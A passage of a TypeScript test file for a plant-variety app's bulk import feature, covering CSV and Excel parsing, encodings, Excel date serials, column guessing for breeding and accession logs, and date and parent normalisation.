// Date your whole collection (bulk-import.ts): reading CSV and Excel files, guessing the
// columns, checking rows, sealing them exactly as the logging flow does, picking up after a
// closed tab without sealing a row twice, the results file, and the key date stamp queue.
// SPDX-License-Identifier: Apache-2.0
import { beforeEach, describe, expect, it, vi } from 'vitest';
import { strToU8, zipSync } from 'fflate';
import {
  KEY_STAMPS_PER_DAY,
  LIMITS,
  MAX_COLUMNS,
  MAX_ROWS,
  MAX_SET,
  checkRows,
  csvCell,
  decodeText,
  detectDateOrder,
  emptyMapping,
  guessMapping,
  importedRecordIds,
  isDateFormat,
  keyStampDays,
  loadLedger,
  normalizeDate,
  parseCsv,
  parseXlsx,
  readSheet,
  recordRowHash,
  resultsCsv,
  noDnaReportCount,
  NO_DNA_REPORT,
  DNA_REPORT_SAVED,
  rowFields,
  rowHashOf,
  sealRowRecord,
  sealRows,
  serialToIso,
  splitParents,
  stampPauseWords,
  stampWait,
  toSheet,
  tooManyRows,
  withHeaderRow,
  type Committer,
  type Mapping,
  type Sheet,
} from './bulk-import';
import { checkIntegrity, type StrainRecord } from './records';
import { __resetRecordKeysForTests, keysFor } from './record-keys';
import { bindingForSecret } from './key-binding';
import { PLANT_VARIETY_PROFILE } from './envelope';

const local = new Map<string, string>();
beforeEach(() => {
  local.clear();
  vi.stubGlobal('localStorage', {
    getItem: (k: string) => local.get(k) ?? null,
    setItem: (k: string, v: string) => void local.set(k, v),
    removeItem: (k: string) => void local.delete(k),
  });
  vi.stubGlobal('fetch', () => {
    throw new Error('these tests never reach the network');
  });
  __resetRecordKeysForTests();
});

const fileOf = (bytes: Uint8Array | string, name: string) => {
  const b = typeof bytes === 'string' ? new TextEncoder().encode(bytes) : bytes;
  return { name, size: b.length, arrayBuffer: () => Promise.resolve(b.slice().buffer) } as unknown as File;
};

const sheetOf = (csv: string): Sheet => {
  const { rows, delimiter, warnings } = parseCsv(csv);
  return toSheet(
    rows.map((cells, i) => ({ line: i + 1, cells })),
    'csv',
    delimiter,
    warnings,
  );
};

const mapAll = (sheet: Sheet, extra: Partial<Mapping> = {}): Mapping => ({ ...guessMapping(sheet.headers), ...extra });

// ── CSV ─────────────────────────────────────────────────────────────────────────────────

describe('reading a CSV', () => {
  it('quotes: separators, doubled quotes and line breaks inside a cell', () => {
    const { rows, delimiter } = parseCsv('a,b,c\r\n"x, y","say ""hi""","two\r\nlines"\r\n');
    expect(delimiter).toBe(',');
    expect(rows).toEqual([
      ['a', 'b', 'c'],
      ['x, y', 'say "hi"', 'two\r\nlines'],
    ]);
  });

  it('a byte order mark is dropped, and unquoted cells are trimmed while quoted ones are kept as they are', () => {
    const { rows } = parseCsv('\uFEFFName,ID\n Harbour Mist , " 7 "\n');
    expect(rows).toEqual([
      ['Name', 'ID'],
      ['Harbour Mist', ' 7 '],
    ]);
  });

  it('semicolons (Excel in much of Europe) and tabs are found; an Excel "sep=" line is obeyed', () => {
    expect(parseCsv('Name;ID;Notes\nA;1;"x; y"\n')).toMatchObject({
      delimiter: ';',
      rows: [
        ['Name', 'ID', 'Notes'],
        ['A', '1', 'x; y'],
      ],
    });
    expect(parseCsv('Name\tID\nA\t1').rows).toEqual([
      ['Name', 'ID'],
      ['A', '1'],
    ]);
    expect(parseCsv('sep=;\nName,with comma;ID\nA,B;1\n')).toMatchObject({
      delimiter: ';',
      rows: [
        ['Name,with comma', 'ID'],
        ['A,B', '1'],
      ],
    });
  });

  it('old Mac line ends, no final line end, and a quote never closed (said, not hidden)', () => {
    expect(parseCsv('a,b\rc,d').rows).toEqual([
      ['a', 'b'],
      ['c', 'd'],
    ]);
    const open = parseCsv('a,b\n"never closed,x\ny,z');
    expect(open.warnings).toHaveLength(1);
    expect(open.rows[1]).toEqual(['never closed,x\ny,z']);
  });

  it('text: UTF-8 with or without a BOM, UTF-16 with a BOM, and Windows-1252 (Excel’s "CSV" on Windows)', () => {
    expect(decodeText(new Uint8Array([0xef, 0xbb, 0xbf, 0x43, 0x61, 0x66, 0xc3, 0xa9]))).toBe('Café');
    expect(decodeText(new Uint8Array([0x43, 0x61, 0x66, 0xe9]))).toBe('Café');
    expect(decodeText(new Uint8Array([0xff, 0xfe, 0x41, 0x00, 0xe9, 0x00]))).toBe('Aé');
  });

  it('a sheet: header from the first filled row, empty rows dropped, row numbers as the spreadsheet shows them', async () => {
    const s = await readSheet(fileOf('\n"Name","Name",,\nA,1,,\n,,,\n"B\nstill B",2,,extra\n', 'log.csv'));
    expect(s.headers).toEqual(['Name', 'Name (2)', 'Column C', 'Column D']);
    expect(s.rows.map((r) => r.line)).toEqual([3, 5]);
    expect(s.rows[1].cells).toEqual(['B\nstill B', '2', '', 'extra']);
  });

  it('refuses files it can’t read, in plain words', async () => {
    await expect(readSheet(fileOf('x', 'old.xls'))).rejects.toThrow(/Save it as Excel \(.xlsx\) or CSV/);
    const big = { name: 'big.csv', size: 6 * 1024 * 1024, arrayBuffer: () => Promise.resolve(new ArrayBuffer(0)) };
    await expect(readSheet(big as unknown as File)).rejects.toThrow(/larger than 5 MB/);
    await expect(readSheet(fileOf('not a zip', 'x.xlsx'))).rejects.toThrow(/couldn't be opened as an Excel/);
  });
});

// ── XLSX ────────────────────────────────────────────────────────────────────────────────

const OPENPYXL_FIXTURE = [
  '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',
].join('');

const b64 = (s: string) => Uint8Array.from(atob(s), (c) => c.charCodeAt(0));

/** A hand-made .xlsx the way Excel writes one: shared strings, styles, a namespace prefix if asked. */
const makeXlsx = (opts: { date1904?: boolean; prefix?: string } = {}) => {
  const p = opts.prefix ? `${opts.prefix}:` : '';
  const ns = opts.prefix ? `xmlns:${opts.prefix}` : 'xmlns';
  const files = {
    'xl/workbook.xml': `<?xml version="1.0"?><${p}workbook ${ns}="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">${opts.date1904 ? `<${p}workbookPr date1904="1"/>` : ''}<${p}sheets><${p}sheet name="Log" sheetId="7" r:id="rId9"/><${p}sheet name="Second" sheetId="1" r:id="rId1"/></${p}sheets></${p}workbook>`,
    'xl/_rels/workbook.xml.rels': `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="worksheet" Target="worksheets/sheet1.xml"/><Relationship Id="rId9" Type="worksheet" Target="/xl/worksheets/sheet2.xml"/></Relationships>`,
    'xl/sharedStrings.xml': `<?xml version="1.0"?><${p}sst ${ns}="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><${p}si><${p}t>Plant name</${p}t></${p}si><${p}si><${p}t>Date</${p}t></${p}si><${p}si><${p}r><${p}t>Rich </${p}t></${p}r><${p}r><${p}rPr/><${p}t xml:space="preserve">&amp; bold</${p}t></${p}r><${p}rPh><${p}t>ふりがな</${p}t></${p}rPh></${p}si><${p}si><${p}t>line_x000D__x000A_two</${p}t></${p}si><${p}si><${p}t>ID</${p}t></${p}si></${p}sst>`,
    'xl/styles.xml': `<?xml version="1.0"?><${p}styleSheet ${ns}="x"><${p}numFmts count="1"><${p}numFmt numFmtId="164" formatCode="[$-409]d\\-mmm\\-yyyy;@"/></${p}numFmts><${p}cellXfs count="4"><${p}xf numFmtId="0"/><${p}xf numFmtId="14" applyNumberFormat="1"/><${p}xf numFmtId="164"><${p}alignment/></${p}xf><${p}xf numFmtId="2"/></${p}cellXfs></${p}styleSheet>`,
    'xl/worksheets/sheet1.xml': `<${p}worksheet ${ns}="x"><${p}sheetData><${p}row r="1"><${p}c r="A1" t="inlineStr"><${p}is><${p}t>WRONG SHEET</${p}t></${p}is></${p}c></${p}row></${p}sheetData></${p}worksheet>`,
    'xl/worksheets/sheet2.xml': `<${p}worksheet ${ns}="x"><${p}cols><${p}col min="1" max="3"/></${p}cols><${p}sheetData><${p}row r="1"><${p}c r="A1" t="s"><${p}v>0</${p}v></${p}c><${p}c r="B1" t="s"><${p}v>1</${p}v></${p}c><${p}c r="D1" t="s"><${p}v>4</${p}v></${p}c></${p}row><${p}row r="2"><${p}c r="A2" t="s"><${p}v>2</${p}v></${p}c><${p}c r="B2" s="1"><${p}v>44562</${p}v></${p}c><${p}c r="C2" s="3"><${p}v>44562</${p}v></${p}c><${p}c r="D2"><${p}v>000123</${p}v></${p}c></${p}row><${p}row r="4"><${p}c r="A4" t="s"><${p}v>3</${p}v></${p}c><${p}c r="B4" s="2"><${p}v>43831.75</${p}v></${p}c><${p}c r="C4" t="b"><${p}v>0</${p}v></${p}c><${p}c r="D4" t="str"><${p}v>A&amp;B</${p}v></${p}c></${p}row><${p}row r="5"><${p}c r="A5" t="e"><${p}v>#N/A</${p}v></${p}c><${p}c r="B5" t="d"><${p}v>2023-05-06T00:00:00</${p}v></${p}c><${p}c r="C5"/></${p}row></${p}sheetData></${p}worksheet>`,
  };
  return zipSync(Object.fromEntries(Object.entries(files).map(([k, v]) => [k, strToU8(v)])));
};

describe('reading an .xlsx', () => {
  it('the first sheet in the workbook’s order, shared strings, rich text, Excel escapes and dates', () => {
    const rows = parseXlsx(makeXlsx());
    expect(rows).toEqual([
      { line: 1, cells: ['Plant name', 'Date', '', 'ID'] },
      { line: 2, cells: ['Rich & bold', '2022-01-01', '44562', '000123'] },
      { line: 4, cells: ['line\r\ntwo', '2020-01-01', 'FALSE', 'A&B'] },
      { line: 5, cells: ['#N/A', '2023-05-06', ''] },
    ]);
  });

  it('the 1904 date system, and namespace prefixes (some tools write <x:c>)', () => {
    expect(parseXlsx(makeXlsx({ date1904: true }))[1].cells[1]).toBe('2026-01-02');
    expect(parseXlsx(makeXlsx({ prefix: 'x' }))[1].cells.slice(0, 2)).toEqual(['Rich & bold', '2022-01-01']);
  });

  it('a file written by a real spreadsheet library (openpyxl): inline strings, dates, unicode, a formula', async () => {
    const s = await readSheet(fileOf(b64(OPENPYXL_FIXTURE), 'accessions.xlsx'));
    expect(s.kind).toBe('xlsx');
    expect(s.headers).toEqual(['Accession #', 'Cultivar', 'Species', 'Mother', 'Father', 'Date received', 'Comments']);
    expect(s.rows.map((r) => r.line)).toEqual([2, 3, 5, 6]);
    expect(s.rows[0].cells).toEqual([
      'TC-0001',
      'Harbour Mist',
      'Solanum lycopersicum',
      'Alpha',
      'Beta',
      '2021-03-14',
      'Says "hi", then\nnew line',
    ]);
    expect(s.rows[1].cells.slice(0, 2)).toEqual(['TC-0002', 'Café Noir & Co']);
    expect(s.rows[1].cells[5]).toBe('2019-12-31');
    expect(s.rows[2].cells.slice(0, 3)).toEqual(['3', 'Ünïcødé 名前', 'Rubus']);
    expect(s.rows[2].cells[5]).toBe('Spring 2019');
    expect(s.rows[3].cells[5]).toBe('2020-07-04');
    expect(s.rows[3].cells[6]).toBe('TRUE');
  });

  it('Excel’s date serials, including its 1900 leap-year quirk, and which formats are dates', () => {
    expect(serialToIso(1)).toBe('1900-01-01');
    expect(serialToIso(59)).toBe('1900-02-28');
    expect(serialToIso(61)).toBe('1900-03-01');
    expect(serialToIso(44562)).toBe('2022-01-01');
    expect(serialToIso(44562.99)).toBe('2022-01-01');
    expect(serialToIso(1, true)).toBe('1904-01-02');
    expect(serialToIso(0)).toBeUndefined();
    expect(isDateFormat(14)).toBe(true);
    expect(isDateFormat(164, 'yyyy-mm-dd')).toBe(true);
    expect(isDateFormat(164, '[$-409]d-mmm-yy')).toBe(true);
    expect(isDateFormat(164, '0.00')).toBe(false);
    expect(isDateFormat(164, 'mm:ss')).toBe(false);
    expect(isDateFormat(164, '"day "0')).toBe(false);
    expect(isDateFormat(0, 'General')).toBe(false);
    expect(isDateFormat(20)).toBe(false); // a time of day
  });
});

// ── Columns and values ──────────────────────────────────────────────────────────────────

describe('guessing which column is which', () => {
  const cols = (headers: string[]) => guessMapping(headers).columns;

  it('a tissue-culture lab’s accession log', () => {
    expect(
      cols(['Accession #', 'Cultivar', 'Species', 'Mother', 'Father', 'Breeder', 'Date received', 'Comments']),
    ).toEqual({ refId: 0, strainName: 1, taxon: 2, parents: 3, parents2: 4, bredBy: 5, dateCreated: 6, notes: 7 });
  });

  it('a breeder’s own list, and other common names', () => {
    expect(cols(['Name', 'ID', 'Parents', 'Year', 'Notes'])).toMatchObject({
      strainName: 0,
      refId: 1,
      parents: 2,
      dateCreated: 3,
      notes: 4,
      taxon: null,
      bredBy: null,
      parents2: null,
    });
    expect(
      cols(['Plant ID', 'Plant name', 'Scientific name', 'Pedigree', 'Bred by', 'Date bred', 'Description']),
    ).toEqual({ refId: 0, strainName: 1, taxon: 2, parents: 3, parents2: null, bredBy: 4, dateCreated: 5, notes: 6 });
    expect(cols(['Lot no.', 'Variety', 'Seed parent', 'Pollen parent'])).toMatchObject({
      refId: 0,
      strainName: 1,
      parents: 2,
      parents2: 3,
    });
    expect(cols(['Something', 'Else'])).toMatchObject({ strainName: null, refId: null });
  });
});

describe('values as they are sealed', () => {
  it('parents in one cell are split outside brackets only', () => {
    expect(splitParents('Mother x Father')).toEqual(['Mother', 'Father']);
    expect(splitParents('A × B')).toEqual(['A', 'B']);
    expect(splitParents('(A x B) X C')).toEqual(['(A x B)', 'C']);
    expect(splitParents('Xena x Maxim')).toEqual(['Xena', 'Maxim']);
    expect(splitParents('OG/Kush; Blue')).toEqual(['OG/Kush', 'Blue']);
    expect(splitParents('A / B')).toEqual(['A', 'B']);
    expect(splitParents('  ')).toEqual([]);
  });

  it('dates: ISO kept, clear ones made ISO, unclear ones kept as written unless the order is given', () => {
    expect(normalizeDate('2021-3-4')).toEqual({ value: '2021-03-04', ambiguous: false });
    expect(normalizeDate('2021/03/04')).toEqual({ value: '2021-03-04', ambiguous: false });
    expect(normalizeDate('3/14/2021').value).toBe('2021-03-14');
    expect(normalizeDate('14/03/2021').value).toBe('2021-03-14');
    expect(normalizeDate('14.03.21').value).toBe('2021-03-14');
    expect(normalizeDate('04.03.2021').value).toBe('2021-03-04'); // dots: day first
    expect(normalizeDate('03/04/2021')).toEqual({ value: '03/04/2021', ambiguous: true });
    expect(normalizeDate('03/04/2021', 'dmy').value).toBe('2021-04-03');
    expect(normalizeDate('03/04/2021', 'mdy').value).toBe('2021-03-04');
    expect(normalizeDate('5/5/99').value).toBe('1999-05-05');
    expect(normalizeDate('44562').value).toBe('2022-01-01'); // an Excel serial that came through a CSV
    expect(normalizeDate('Spring 2019').value).toBe('Spring 2019');
    expect(normalizeDate('2019').value).toBe('2019');
    expect(normalizeDate('2021-02-30').value).toBe('2021-02-30'); // not a date: kept as written
    expect(detectDateOrder(['03/04/2021', '25/12/2020'])).toBe('dmy');
    expect(detectDateOrder(['03/04/2021', '12/25/2020'])).toBe('mdy');
    expect(detectDateOrder(['03/04/2021'])).toBeUndefined();
    expect(detectDateOrder(['25/12/2020', '12/25/2020'])).toBeUndefined();
  });

  it('a row: trimmed, one line except notes, bred-by default where the row says nothing', () => {
    const s = sheetOf(
